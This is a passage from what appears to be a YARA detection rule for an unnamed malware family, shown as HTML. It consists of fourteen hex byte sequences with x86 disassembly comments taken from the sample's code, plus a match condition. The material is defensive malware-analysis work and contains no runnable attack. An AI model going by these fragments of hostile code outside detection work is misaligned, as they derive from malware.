&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, dword ptr [ebp + 0x10]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;51&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ecx<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_1 = { 3a4101 7523 83854cf6ffff02 838550f6ffff02 80bd4af6ffff00 75ae c78544f6ffff00000000 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 7, score = 300<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;3a4101&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| cmp&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;al, byte ptr [ecx + 1]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp; 7523&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jne&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0x25<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;83854cf6ffff02&nbsp; &nbsp; &nbsp; &nbsp;| add&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 0x9b4], 2<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;838550f6ffff02&nbsp; &nbsp; &nbsp; &nbsp;| add&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 0x9b0], 2<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;80bd4af6ffff00&nbsp; &nbsp; &nbsp; &nbsp;| cmp&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;byte ptr [ebp - 0x9b6], 0<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;75ae&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jne&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0xffffffb0<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;c78544f6ffff00000000&nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp;dword ptr [ebp - 0x9bc], 0<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_2 = { 50 ff15???????? a3???????? 68???????? e8???????? 83c404 50 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 7, score = 300<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;50&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;ff15????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;a3????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;68????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e8????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;83c404&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| add&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;esp, 4<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;50&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp;eax<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_3 = { 8d8dd4faffff 51 e8???????? 83c408 8b15???????? }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 5, score = 300<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8d8dd4faffff&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| lea&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, [ebp - 0x52c]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;51&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e8????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;83c408&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| add&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;esp, 8<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b15????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_4 = { 8855f5 6a5c 8b450c 50 e8???????? }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 5, score = 300<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8855f5&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;byte ptr [ebp - 0xb], dl<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;6a5c&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x5c<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // &nbsp; 8b450c&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, dword ptr [ebp + 0xc]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;50&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e8????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_5 = { 51 e8???????? 83c410 8b558c 52 }<br>&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;// n = 5, score = 300<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;51&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e8????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;83c410&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| add&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;esp, 0x10<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b558c&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, dword ptr [ebp - 0x74]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;52&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; edx<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_6 = { 8b4d0c 51 68???????? 8d9560eaffff 52 e8???????? }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 6, score = 300<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b4d0c&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, dword ptr [ebp + 0xc]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;51&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;68????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8d9560eaffff&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| lea&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, [ebp - 0x15a0]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;52&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; edx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e8????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_7 = { 83c001 8945f4 837df420 7d2c 8b4df8 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 5, score = 300<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;83c001&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| add&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, 1<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8945f4&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 0xc], eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;837df420&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| cmp&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 0xc], 0x20<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;7d2c&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jge&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0x2e<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b4df8&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, dword ptr [ebp - 8]<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_8 = { 83c001 89856cf6ffff 8b8d70f6ffff 8a11 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 4, score = 300<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;83c001&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| add&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, 1<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;89856cf6ffff&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 0x994], eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b8d70f6ffff&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, dword ptr [ebp - 0x990]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8a11&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dl, byte ptr [ecx]<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_9 = { 0355f0 0fb602 0fb64df7 33c1 0fb655fc 33c2 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 6, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0355f0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| add&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, dword ptr [ebp - 0x10]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0fb602&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| movzx&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, byte ptr [edx]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0fb64df7&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| movzx&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, byte ptr [ebp - 9]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;33c1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| xor&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, ecx<br>&nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp;//&nbsp; &nbsp; 0fb655fc&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| movzx&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, byte ptr [ebp - 4]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;33c2&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| xor&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, edx<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_10 = { d1e9 894df8 8b5518 8955fc c745f000000000 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 5, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;d1e9&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| shr&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, 1<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;894df8&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 8], ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b5518&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, dword ptr [ebp + 0x18]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8955fc&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 4], edx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;c745f000000000&nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 0x10], 0<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_11 = { 8b4df0 3b4d10 0f8d90000000 8b5508 0355f0 0fb602 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 6, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b4df0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, dword ptr [ebp - 0x10]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;3b4d10&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| cmp&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, dword ptr [ebp + 0x10]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0f8d90000000&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jge&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0x96<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b5508&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, dword ptr [ebp + 8]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0355f0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| add&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, dword ptr [ebp - 0x10]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0fb602&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| movzx&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, byte ptr [edx]<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_12 = { 894d14 8b45f8 c1e018 8b4dfc c1e908 0bc1 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 6, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;894d14&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp + 0x14], ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b45f8&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, dword ptr [ebp - 8]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;c1e018&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| shl&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, 0x18<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b4dfc&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, dword ptr [ebp - 4]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;c1e908&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| shr&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, 8<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0bc1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| or&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; eax, ecx<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_13 = { 0bc1 894518 8b5514 8955f8 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 4, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0bc1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| or&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; eax, ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;894518&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp + 0x18], eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b5514&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, dword ptr [ebp + 0x14]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8955f8&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 8], edx<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_14 = { 8b5514 8955f8 8b4518 8945fc e9???????? 8be5 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 6, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b5514&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, dword ptr [ebp + 0x14]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8955f8&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 8], edx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b4518&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, dword ptr [ebp + 0x18]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8945fc&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 4], eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e9????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8be5&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;esp, ebp<br><br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; 7 of them and filesize &lt; 1736704<br>}</td>
</tr>
</tbody>
</table>
